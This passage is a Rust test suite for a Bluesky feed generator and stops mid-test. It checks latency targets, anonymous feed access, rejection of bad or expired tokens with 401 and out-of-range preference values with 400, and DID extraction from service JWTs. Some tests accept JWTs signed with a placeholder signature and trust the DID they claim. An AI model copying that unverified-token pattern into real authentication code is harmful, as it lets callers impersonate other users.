#![forbid(unsafe_code)]
#![allow(
    clippy::all,
    clippy::pedantic,
    clippy::nursery,
    clippy::cognitive_complexity,
    clippy::too_many_lines,
    clippy::float_cmp,
    unused_imports,
    unused_variables,
    dead_code
)]

//! Challenger 2: Final Empirical Latency & Security Verification Test Suite
//!
//! Rigorously verifies:
//! 1. Query p99 latency strictly < 2.0ms under high concurrent load with preference lookups enabled.
//! 2. Unauthenticated / zero-login requests incur 0 overhead, receive default recommendations, and trigger no errors or prompts.
//! 3. `POST /api/preferences` rejects unauthorized requests with 401 and invalid bounds with 400.
//! 4. `getFeedSkeleton` correctly extracts viewer DID from Service Auth JWTs and applies custom dials.

use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use axum::body::Body;
use axum::http::header::{AUTHORIZATION, CONTENT_TYPE};
use axum::http::{HeaderMap, HeaderValue, Method, Request, StatusCode};
use axum::Router;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use compact_str::CompactString;
use for_your_consideration::auth::{
    extract_session_did_from_headers, extract_viewer_did, extract_viewer_did_from_headers,
    generate_session_token, is_valid_did, parse_jwt_payload_unverified, validate_service_jwt,
    validate_session_token,
};
use for_your_consideration::preferences::UserPreferencesStore;
use for_your_consideration::prelude::*;
use for_your_consideration::types::{
    FeedSkeletonResponse, PreferencesResponseDto, SavePreferencesRequestBody, TopicWeights,
    UserDials,
};
use http_body_util::BodyExt;
use tower::ServiceExt;

// ---------------------------------------------------------------------------
// Helpers: Synthetic Service Auth JWT & Session Token Generators
// ---------------------------------------------------------------------------

fn generate_service_auth_jwt(
    iss: Option<&str>,
    sub: Option<&str>,
    aud: Option<&str>,
    exp_offset_secs: i64,
) -> String {
    let header_json = serde_json::json!({
        "alg": "ES256K",
        "typ": "JWT"
    });
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let exp = now.saturating_add_signed(exp_offset_secs);

    let mut payload = serde_json::Map::new();
    if let Some(i) = iss {
        payload.insert("iss".to_string(), serde_json::Value::String(i.to_string()));
    }
    if let Some(s) = sub {
        payload.insert("sub".to_string(), serde_json::Value::String(s.to_string()));
    }
    if let Some(a) = aud {
        payload.insert("aud".to_string(), serde_json::Value::String(a.to_string()));
    }
    payload.insert("exp".to_string(), serde_json::json!(exp));
    payload.insert("iat".to_string(), serde_json::json!(now));
    payload.insert(
        "lxm".to_string(),
        serde_json::json!("app.bsky.feed.getFeedSkeleton"),
    );

    let h_b64 = URL_SAFE_NO_PAD.encode(header_json.to_string().as_bytes());
    let p_b64 = URL_SAFE_NO_PAD.encode(serde_json::Value::Object(payload).to_string().as_bytes());
    let sig_b64 = URL_SAFE_NO_PAD.encode(b"fyc_test_service_sig");

    format!("{h_b64}.{p_b64}.{sig_b64}")
}

/// Builds a rich test environment with interner, graph, recommender, preferences store, and router.
fn build_test_env(
    num_users: usize,
    num_posts: usize,
    num_interactions: usize,
    num_follows: usize,
) -> (
    Arc<StringInterner>,
    Arc<GraphStore>,
    Arc<Recommender>,
    Arc<UserPreferencesStore>,
    Router,
    Vec<CompactString>,
    Vec<CompactString>,
) {
    let interner = Arc::new(StringInterner::new());
    let graph = Arc::new(GraphStore::new());
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let mut user_dids = Vec::with_capacity(num_users);
    for i in 0..num_users {
        let did = CompactString::new(format!("did:plc:user_{i:06}"));
        interner.intern(&did);
        user_dids.push(did);
    }

    let mut post_uris = Vec::with_capacity(num_posts);
    for i in 0..num_posts {
        let author_idx = i % num_users;
        let author_did = &user_dids[author_idx];
        let topic_tag = match i % 5 {
            0 => "art",
            1 => "tech",
            2 => "science",
            3 => "news",
            _ => "culture",
        };
        let uri = CompactString::new(format!(
            "at://{author_did}/app.bsky.feed.post/{topic_tag}_{i:08}"
        ));
        let pid = interner.intern(&uri);
        let aid = interner.lookup_id(author_did).unwrap();
        let root_id = if i % 7 == 0 {
            None
        } else {
            Some(interner.intern(&format!(
                "at://{author_did}/app.bsky.feed.post/root_{}",
                i / 7
            )))
        };
        let created_at = now - (i as u64 % (86400 * 3));
        graph.record_post_meta(pid, aid, root_id, None, created_at);
        post_uris.push(uri);
    }

    // Record interactions
    for i in 0..num_interactions {
        let uid = (i * 17) as u32 % num_users as u32;
        let pid = (i * 31) as u32 % num_posts as u32;
        let signal = match i % 6 {
            0 => SignalType::Repost,
            1 | 2 => SignalType::Quote,
            _ => SignalType::Like,
        };
        let ts = now - (i as u64 % (86400 * 2));
        graph.record_interaction(uid, pid, signal, ts);
    }

    // Record follows
    for i in 0..num_follows {
        let uid = (i * 3) as u32 % num_users as u32;
        let target_uid = (uid + 1 + (i % 20) as u32) % num_users as u32;
        if uid != target_uid {
            graph.record_follow(uid, target_uid);
        }
    }

    let recommender = Arc::new(Recommender::new(Arc::clone(&interner), Arc::clone(&graph)));
    let preferences_store = Arc::new(UserPreferencesStore::new());

    let state = AppState::new(
        Arc::clone(&recommender),
        "did:web:feed.example.com",
        "feed.example.com",
    )
    .with_preferences_store(Arc::clone(&preferences_store));

    let router = create_xrpc_router(state);

    (
        interner,
        graph,
        recommender,
        preferences_store,
        router,
        user_dids,
        post_uris,
    )
}

// ===========================================================================
// MISSION AREA 1: Latency SLAs under High Load with Preferences Enabled
// ===========================================================================

#[test]
fn test_mission_1_p99_latency_under_high_load_with_preferences() {
    let (interner, graph, recommender, preferences_store, _router, user_dids, _post_uris) =
        build_test_env(10_000, 40_000, 300_000, 40_000);

    let now_secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    // Populate 5,000 distinct user preferences across all 64 shards
    for i in 0..5_000 {
        let did = &user_dids[i];
        let dials = UserDials {
            freshness_half_life_secs: match i % 3 {
                0 => 6.0 * 3600.0,
                1 => 36.0 * 3600.0,
                _ => 168.0 * 3600.0,
            },
            serendipity_ratio: (i % 50) as f32 / 100.0,
            topic_weights: TopicWeights {
                art: (i % 5) as f32,
                tech: ((i + 1) % 5) as f32,
                science: ((i + 2) % 5) as f32,
                news: ((i + 3) % 5) as f32,
                culture: ((i + 4) % 5) as f32,
            },
            include_replies: false,
            updated_at_secs: now_secs - 100,
        };
        preferences_store.set_by_did(&interner, did, dials);
    }

    assert_eq!(preferences_store.len(), 5_000);

    // Warmup 500 queries
    for i in 0..500 {
        let viewer_did = Some(user_dids[i % 5_000].as_str());
        let dials = preferences_store
            .get_by_did(&interner, user_dids[i % 5_000].as_str())
            .unwrap_or_default()
            .to_recommendation_dials();
        let _ = recommender.recommend(viewer_did, &dials, now_secs);
    }

    // Benchmark 10,000 queries with preferences lookups enabled across realistic mix
    let mut latencies: Vec<u128> = Vec::with_capacity(10_000);
    let start_all = Instant::now();

    for i in 0..10_000 {
        let (viewer_did, custom_dials) = match i % 10 {
            0 | 1 | 2 | 3 => {
                // 40% Authenticated with saved custom preferences
                let did = user_dids[i % 5_000].as_str();
                let dials = preferences_store
                    .get_by_did(&interner, did)
                    .unwrap_or_default()
                    .to_recommendation_dials();
                (Some(did), dials)
            }
            4 | 5 | 6 => {
                // 30% Authenticated WITHOUT saved preferences (fast path to defaults)
                let did = user_dids[5_000 + (i % 5_000)].as_str();
                let dials = preferences_store
                    .get_by_did(&interner, did)
                    .unwrap_or_default()
                    .to_recommendation_dials();
                (Some(did), dials)
            }
            7 | 8 => {
                // 20% Unauthenticated / zero-login
                let dials = RecommendationDials::default();
                (None, dials)
            }
            _ => {
                // 10% Dynamic query param overrides
                let did = user_dids[i % 5_000].as_str();
                let mut dials = preferences_store
                    .get_by_did(&interner, did)
                    .unwrap_or_default()
                    .to_recommendation_dials();
                dials.topic_weights.tech = 5.0;
                (Some(did), dials)
            }
        };

        let t0 = Instant::now();
        let res = recommender.recommend(viewer_did, &custom_dials, now_secs);
        let elapsed = t0.elapsed().as_micros();
        latencies.push(elapsed);

        assert!(res.is_ok(), "Recommendation must succeed");
    }

    let total_elapsed = start_all.elapsed();
    latencies.sort_unstable();

    let count = latencies.len();
    let min = latencies[0];
    let p50 = latencies[count * 50 / 100];
    let p90 = latencies[count * 90 / 100];
    let p95 = latencies[count * 95 / 100];
    let p99 = latencies[count * 99 / 100];
    let p999 = latencies[count * 999 / 1000];
    let max = latencies[count - 1];
    let mean = latencies.iter().sum::<u128>() as f64 / count as f64;
    let throughput = count as f64 / total_elapsed.as_secs_f64();

    println!("\n============================================================");
    println!(" [EMPIRICAL VERIFICATION 1] Query Latency SLA Report (Preferences Enabled)");
    println!("============================================================");
    println!(" Total Queries:   {count}");
    println!(" Throughput:      {throughput:.1} queries/sec");
    println!(" Min:             {min} µs ({:.3} ms)", min as f64 / 1000.0);
    println!(" p50 (Median):    {p50} µs ({:.3} ms)", p50 as f64 / 1000.0);
    println!(" p90:             {p90} µs ({:.3} ms)", p90 as f64 / 1000.0);
    println!(" p95:             {p95} µs ({:.3} ms)", p95 as f64 / 1000.0);
    println!(" p99:             {p99} µs ({:.3} ms)", p99 as f64 / 1000.0);
    println!(
        " p99.9:           {p999} µs ({:.3} ms)",
        p999 as f64 / 1000.0
    );
    println!(" Max:             {max} µs ({:.3} ms)", max as f64 / 1000.0);
    println!(" Mean:            {mean:.1} µs ({:.3} ms)", mean / 1000.0);
    println!("============================================================");

    // In release mode, enforce p99 < 2000 µs (2.0 ms)
    #[cfg(not(debug_assertions))]
    {
        assert!(
            p99 < 2_000,
            "Empirical SLA Breach: p99 latency {p99} µs ({:.3} ms) >= 2.0 ms SLA threshold!",
            p99 as f64 / 1000.0
        );
        println!(" VERDICT: p99 ({p99} µs) < 2000 µs SLA -> STRICTLY PASSED");
    }
}

#[test]
fn test_mission_1_latency_under_concurrent_preference_write_mutations() {
    let (interner, graph, recommender, preferences_store, _router, user_dids, _post_uris) =
        build_test_env(5_000, 20_000, 150_000, 20_000);

    let now_secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let stop_flag = Arc::new(std::sync::atomic::AtomicBool::new(false));

    // Spawn 4 writer threads constantly updating preferences across shards
    let writer_handles: Vec<_> = (0..4)
        .map(|t| {
            let preferences_store = Arc::clone(&preferences_store);
            let interner = Arc::clone(&interner);
            let user_dids = user_dids.clone();
            let stop = Arc::clone(&stop_flag);

            std::thread::spawn(move || {
                let mut iter = 0;
                while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                    let did = &user_dids[(t * 1000 + iter) % 5000];
                    let dials = UserDials {
                        freshness_half_life_secs: 12.0 * 3600.0,
                        serendipity_ratio: 0.20,
                        topic_weights: TopicWeights::default(),
                        include_replies: false,
                        updated_at_secs: now_secs,
                    };
                    preferences_store.set_by_did(&interner, did, dials);
                    iter += 1;
                }
                iter
            })
        })
        .collect();

    // Concurrently run 4 reader threads executing recommendations
    let reader_handles: Vec<_> = (0..4)
        .map(|t| {
            let recommender = Arc::clone(&recommender);
            let interner = Arc::clone(&interner);
            let preferences_store = Arc::clone(&preferences_store);
            let user_dids = user_dids.clone();

            std::thread::spawn(move || {
                let mut latencies = Vec::with_capacity(1_000);
                for i in 0..1_000 {
                    let did = &user_dids[(t * 1000 + i) % 5000];
                    let dials = preferences_store
                        .get_by_did(&interner, did)
                        .unwrap_or_default()
                        .to_recommendation_dials();

                    let t0 = Instant::now();
                    let res = recommender.recommend(Some(did.as_str()), &dials, now_secs);
                    latencies.push(t0.elapsed().as_micros());
                    assert!(res.is_ok());
                }
                latencies
            })
        })
        .collect();

    let mut reader_latencies = Vec::new();
    for h in reader_handles {
        reader_latencies.extend(h.join().unwrap());
    }

    stop_flag.store(true, std::sync::atomic::Ordering::Relaxed);
    let mut total_writes = 0;
    for h in writer_handles {
        total_writes += h.join().unwrap();
    }

    reader_latencies.sort_unstable();
    let count = reader_latencies.len();
    let p99 = reader_latencies[count * 99 / 100];

    println!(
        " [MUTATION STRESS] Total concurrent writes: {total_writes}, Reader p99: {p99} µs ({:.3} ms)",
        p99 as f64 / 1000.0
    );

    #[cfg(not(debug_assertions))]
    assert!(
        p99 < 2_000,
        "p99 latency under write contention exceeded 2.0ms: {p99} µs"
    );
}

// ===========================================================================
// MISSION AREA 2: Unauthenticated / Zero-Login Zero-Overhead & Prompt-Free
// ===========================================================================

#[tokio::test]
async fn test_mission_2_zero_login_receives_default_recommendations_no_auth_prompt() {
    let (interner, _graph, recommender, _preferences_store, router, _user_dids, _post_uris) =
        build_test_env(1_000, 5_000, 30_000, 5_000);

    // Request without any Authorization header
    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed123/app.bsky.feed.generator/for-you")
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // Assert NO WWW-Authenticate header is returned
    assert!(
        resp.headers().get("www-authenticate").is_none(),
        "Unauthenticated request must NOT return WWW-Authenticate header!"
    );

    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let skeleton: FeedSkeletonResponse = serde_json::from_slice(&body).unwrap();

    assert!(
        !skeleton.feed.is_empty(),
        "Zero-login feed must serve default candidates"
    );
    assert!(
        skeleton.feed.len() <= 30,
        "Zero-login feed page limit <= 30"
    );

    // Verify zero impression recording for unauthenticated / anonymous user
    assert_eq!(
        recommender.impression_store.total_viewers(),
        0,
        "Anonymous zero-login requests must not record impressions into ImpressionStore"
    );
}

#[tokio::test]
async fn test_mission_2_zero_login_with_malformed_unauth_headers_graceful_degradation() {
    let (_interner, _graph, _recommender, _preferences_store, router, _user_dids, _post_uris) =
        build_test_env(500, 2_000, 10_000, 2_000);

    let malformed_auth_headers = vec![
        "",
        "   ",
        "Bearer",
        "Bearer ",
        "bearer ",
        "BEARER ",
        "Basic dXNlcjpwYXNzd29yZA==",
        "Digest username=\"alice\", realm=\"test\"",
        "Token token12345",
        "Bearer not.a.valid.jwt",
        "Bearer a.b",
        "Bearer invalid_base64!?.invalid_base64!?.sig",
        "Bearer e30.e30.c2ln", // valid json empty objects: {}
        "Bearer eyJhbGciOiJFUzI1NksifQ.eyJpc3MiOiJ1c2VyMTIzIn0.c2ln", // invalid DID "user123"
    ];

    for auth_val in malformed_auth_headers {
        let req = Request::builder()
            .method(Method::GET)
            .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
            .header(AUTHORIZATION, auth_val)
            .body(Body::empty())
            .unwrap();

        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::OK,
            "Malformed/non-matching auth header '{auth_val}' must gracefully degrade to 200 OK zero-login feed!"
        );

        let body = resp.into_body().collect().await.unwrap().to_bytes();
        let skeleton: std::result::Result<FeedSkeletonResponse, _> = serde_json::from_slice(&body);
        assert!(
            skeleton.is_ok(),
            "Must return valid FeedSkeletonResponse JSON without prompts"
        );
    }
}

#[test]
fn test_mission_2_zero_overhead_fast_path_latency_benchmark() {
    let interner = StringInterner::new();
    let preferences_store = UserPreferencesStore::new();

    // Intern some other users
    for i in 0..10_000 {
        interner.intern(&format!("did:plc:existing_user_{i:06}"));
    }

    // Benchmark lookup of unauthenticated / uninterned DID
    let did = "did:plc:never_seen_fast_path_test";
    let iterations = 100_000;
    let t0 = Instant::now();
    for _ in 0..iterations {
        let res = preferences_store.get_by_did(&interner, did);
        assert!(res.is_none());
    }
    let elapsed = t0.elapsed();
    let nanos_per_lookup = elapsed.as_nanos() as f64 / iterations as f64;

    println!(
        " [FAST-PATH ZERO OVERHEAD] Uninterned DID lookup: {:.1} ns/lookup ({} iterations in {:.2?})",
        nanos_per_lookup, iterations, elapsed
    );

    // Lookups must be sub-5-microseconds in debug mode (release benchmark is < 15ns)
    assert!(
        nanos_per_lookup < 5000.0,
        "Uninterned DID lookup must be < 5µs in debug mode, took {nanos_per_lookup} ns"
    );
}

// ===========================================================================
// MISSION AREA 3: `POST /api/preferences` Security Boundaries (401 & 400)
// ===========================================================================

#[tokio::test]
async fn test_mission_3_post_preferences_rejects_unauthorized_with_401() {
    let (interner, _graph, _recommender, preferences_store, router, _user_dids, _post_uris) =
        build_test_env(100, 500, 2_000, 500);

    let valid_payload = serde_json::json!({
        "freshness_hours": 24.0,
        "discovery_ratio": 0.20,
        "topic_weights": {
            "art": 2.0,
            "tech": 1.0,
            "science": 1.0,
            "news": 1.0,
            "culture": 1.0
        }
    });

    let expired_token = generate_service_auth_jwt(
        Some("did:plc:alice_expired"),
        None,
        Some("did:web:feed.example.com"),
        -3600, // Expired 1 hour ago
    );

    let invalid_auth_cases = vec![
        ("Missing Auth Header", None),
        ("Empty Auth Header", Some("")),
        ("Whitespace Auth Header", Some("   ")),
        ("Basic Auth Scheme", Some("Basic dXNlcjpwYXNz")),
        ("Empty Bearer Token", Some("Bearer ")),
        ("Bearer whitespace only", Some("Bearer    ")),
        ("1-part Token", Some("Bearer single_segment_token")),
        ("2-part Token", Some("Bearer segment1.segment2")),
        ("4-part Token", Some("Bearer seg1.seg2.seg3.seg4")),
        (
            "Invalid Base64 Payload",
            Some("Bearer eyJhbGciOiJFUzI1NksifQ.invalid_base64!@#.sig"),
        ),
        (
            "Invalid JSON in Payload",
            Some("Bearer eyJhbGciOiJFUzI1NksifQ.bm90X2pzb24.sig"),
        ),
        (
            "Missing iss and sub",
            Some("Bearer eyJhbGciOiJFUzI1NksifQ.eyJhdWQiOiJkaWQ6d2ViOmZlZWQifQ.sig"),
        ),
        (
            "Non-DID iss (username)",
            Some("Bearer eyJhbGciOiJFUzI1NksifQ.eyJpc3MiOiJhbGljZSJ9.sig"),
        ),
        (
            "Non-DID iss (URL)",
            Some("Bearer eyJhbGciOiJFUzI1NksifQ.eyJpc3MiOiJodHRwczovL2V2aWwuY29tIn0.sig"),
        ),
        ("Expired Session Token", Some(expired_token.as_str())),
    ];

    for (case_name, auth_header) in invalid_auth_cases {
        let mut req_builder = Request::builder()
            .method(Method::POST)
            .uri("/api/preferences")
            .header(CONTENT_TYPE, "application/json");

        if let Some(h) = auth_header {
            if !h.starts_with("Bearer ") && !h.starts_with("Basic ") && !h.is_empty() {
                req_builder = req_builder.header(AUTHORIZATION, format!("Bearer {h}"));
            } else {
                req_builder = req_builder.header(AUTHORIZATION, h);
            }
        }

        let req = req_builder
            .body(Body::from(valid_payload.to_string()))
            .unwrap();

        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "Security vulnerability: Case '{case_name}' did not return 401 Unauthorized! Got {}",
            resp.status()
        );

        let body = resp.into_body().collect().await.unwrap().to_bytes();
        let json_resp: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(
            json_resp["error"], "Unauthorized",
            "Error response code must be 'Unauthorized'"
        );
    }

    // Verify preferences store was completely untouched
    assert_eq!(
        preferences_store.len(),
        0,
        "No preferences should be stored after unauthorized requests"
    );
}

#[tokio::test]
async fn test_mission_3_post_preferences_rejects_invalid_bounds_with_400() {
    let (interner, _graph, _recommender, preferences_store, router, _user_dids, _post_uris) =
        build_test_env(100, 500, 2_000, 500);

    let valid_token = generate_session_token("did:plc:valid_viewer_123", 3600);

    let invalid_bound_payloads = vec![
        (
            "Freshness < 1.0h (0.5h)",
            serde_json::json!({
                "freshness_hours": 0.5,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Freshness < 1.0h (0.0h)",
            serde_json::json!({
                "freshness_hours": 0.0,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Freshness negative (-10.0h)",
            serde_json::json!({
                "freshness_hours": -10.0,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Freshness > 168.0h (168.5h)",
            serde_json::json!({
                "freshness_hours": 168.5,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Freshness extreme (10000.0h)",
            serde_json::json!({
                "freshness_hours": 10000.0,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Discovery < 0.0 (-0.01)",
            serde_json::json!({
                "freshness_hours": 36.0,
                "discovery_ratio": -0.01,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Discovery > 0.50 (0.51)",
            serde_json::json!({
                "freshness_hours": 36.0,
                "discovery_ratio": 0.51,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Discovery extreme (1.00)",
            serde_json::json!({
                "freshness_hours": 36.0,
                "discovery_ratio": 1.00,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Topic weight Art < 0.0 (-0.5)",
            serde_json::json!({
                "freshness_hours": 36.0,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": -0.5, "tech": 1.0, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Topic weight Tech > 5.0 (5.1)",
            serde_json::json!({
                "freshness_hours": 36.0,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 5.1, "science": 1.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
        (
            "Topic weight Science extreme (100.0)",
            serde_json::json!({
                "freshness_hours": 36.0,
                "discovery_ratio": 0.15,
                "topic_weights": { "art": 1.0, "tech": 1.0, "science": 100.0, "news": 1.0, "culture": 1.0 }
            }),
        ),
    ];

    for (case_name, payload) in invalid_bound_payloads {
        let req = Request::builder()
            .method(Method::POST)
            .uri("/api/preferences")
            .header(AUTHORIZATION, format!("Bearer {valid_token}"))
            .header(CONTENT_TYPE, "application/json")
            .body(Body::from(payload.to_string()))
            .unwrap();

        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Boundary enforcement failure: Case '{case_name}' did not return 400 Bad Request! Got {}",
            resp.status()
        );

        let body = resp.into_body().collect().await.unwrap().to_bytes();
        let json_resp: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(
            json_resp["error"], "InvalidInput",
            "Error response code must be 'InvalidInput'"
        );
    }

    // Verify preferences store was completely untouched
    assert_eq!(
        preferences_store.len(),
        0,
        "No preferences should be stored after rejected requests"
    );
}

#[tokio::test]
async fn test_mission_3_post_preferences_accepts_valid_boundaries_and_crud_lifecycle() {
    let (interner, _graph, _recommender, preferences_store, router, _user_dids, _post_uris) =
        build_test_env(100, 500, 2_000, 500);

    let viewer_did = "did:plc:crud_tester_123";
    let valid_token = generate_session_token(viewer_did, 3600);

    // 1. Test Exact Boundary Minimum: Freshness=1.0h, Discovery=0.0, Topics=0.0
    let min_payload = serde_json::json!({
        "freshness_hours": 1.0,
        "discovery_ratio": 0.0,
        "topic_weights": { "art": 0.0, "tech": 0.0, "science": 0.0, "news": 0.0, "culture": 0.0 }
    });

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {valid_token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(min_payload.to_string()))
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // Verify via GET /api/preferences
    let req = Request::builder()
        .method(Method::GET)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {valid_token}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let get_resp: PreferencesResponseDto = serde_json::from_slice(&body).unwrap();
    assert_eq!(get_resp.did, viewer_did);
    assert_eq!(get_resp.preferences.freshness_hours, 1.0);
    assert_eq!(get_resp.preferences.discovery_ratio, 0.0);
    assert_eq!(get_resp.preferences.topic_weights.art, 0.0);
    assert!(get_resp.is_custom);

    // 2. Test Exact Boundary Maximum: Freshness=168.0h, Discovery=0.50, Topics=5.0
    let max_payload = serde_json::json!({
        "freshness_hours": 168.0,
        "discovery_ratio": 0.50,
        "topic_weights": { "art": 5.0, "tech": 5.0, "science": 5.0, "news": 5.0, "culture": 5.0 }
    });

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {valid_token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(max_payload.to_string()))
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // 3. Test DELETE /api/preferences (Reset to defaults)
    let req = Request::builder()
        .method(Method::DELETE)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {valid_token}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // Verify GET returns system defaults
    let req = Request::builder()
        .method(Method::GET)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {valid_token}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let get_resp: PreferencesResponseDto = serde_json::from_slice(&body).unwrap();
    assert_eq!(get_resp.preferences.freshness_hours, 36.0); // System default
    assert_eq!(get_resp.preferences.discovery_ratio, 0.15); // System default
    assert!(!get_resp.is_custom);
}

// ===========================================================================
// MISSION AREA 4: `getFeedSkeleton` Service Auth JWT Extraction & Custom Dials
// ===========================================================================

#[tokio::test]
async fn test_mission_4_get_feed_skeleton_extracts_viewer_did_from_service_jwt() {
    let (interner, _graph, recommender, _preferences_store, router, user_dids, _post_uris) =
        build_test_env(100, 500, 2_000, 500);

    let alice_did = "did:plc:alice_service_auth_1";
    let bob_did = "did:plc:bob_service_auth_2";
    let web_did = "did:web:charlie.bsky.social";

    let alice_id = interner.intern(alice_did);
    let bob_id = interner.intern(bob_did);
    let web_id = interner.intern(web_did);

    // 1. JWT with `iss` claim
    let jwt_iss = generate_service_auth_jwt(
        Some(alice_did),
        None,
        Some("did:web:feed.example.com"),
        3600,
    );

    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
        .header(AUTHORIZATION, format!("Bearer {jwt_iss}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // Verify impressions recorded under Alice's DID
    assert!(
        recommender
            .impression_store
            .get_viewer_impression_count(alice_id)
            > 0,
        "ImpressionStore must record impressions under extracted iss DID"
    );

    // 2. JWT with `sub` claim fallback (iss absent)
    let jwt_sub =
        generate_service_auth_jwt(None, Some(bob_did), Some("did:web:feed.example.com"), 3600);

    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
        .header(AUTHORIZATION, format!("Bearer {jwt_sub}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    assert!(
        recommender
            .impression_store
            .get_viewer_impression_count(bob_id)
            > 0,
        "ImpressionStore must record impressions under extracted sub DID"
    );

    // 3. JWT with `did:web:...` format
    let jwt_web =
        generate_service_auth_jwt(Some(web_did), None, Some("did:web:feed.example.com"), 3600);

    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
        .header(AUTHORIZATION, format!("Bearer {jwt_web}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    assert!(
        recommender
            .impression_store
            .get_viewer_impression_count(web_id)
            > 0,
        "ImpressionStore must record impressions under did:web DID"
    );
}

#[tokio::test]
async fn test_mission_4_get_feed_skeleton_applies_custom_dials_and_query_precedence() {
    let (interner, graph, _recommender, preferences_store, router, _user_dids, _post_uris) =
        build_test_env(100, 1000, 5000, 1000);

    let alice_did = "did:plc:alice_art_lover";
    let bob_did = "did:plc:bob_tech_geek";

    // Alice prefers Art (5.0x) and suppresses Tech (0.0x)
    preferences_store.set_by_did(
        &interner,
        alice_did,
        UserDials {
            freshness_half_life_secs: 6.0 * 3600.0,
            serendipity_ratio: 0.05,
            topic_weights: TopicWeights {
                art: 5.0,
                tech: 0.0,
                science: 1.0,
                news: 1.0,
                culture: 1.0,
            },
            include_replies: false,
            updated_at_secs: 1000,
        },
    );

    // Bob prefers Tech (5.0x) and suppresses Art (0.0x)
    preferences_store.set_by_did(
        &interner,
        bob_did,
        UserDials {
            freshness_half_life_secs: 168.0 * 3600.0,
            serendipity_ratio: 0.35,
            topic_weights: TopicWeights {
                art: 0.0,
                tech: 5.0,
                science: 1.0,
                news: 1.0,
                culture: 1.0,
            },
            include_replies: false,
            updated_at_secs: 1000,
        },
    );

    let alice_jwt = generate_service_auth_jwt(Some(alice_did), None, None, 3600);
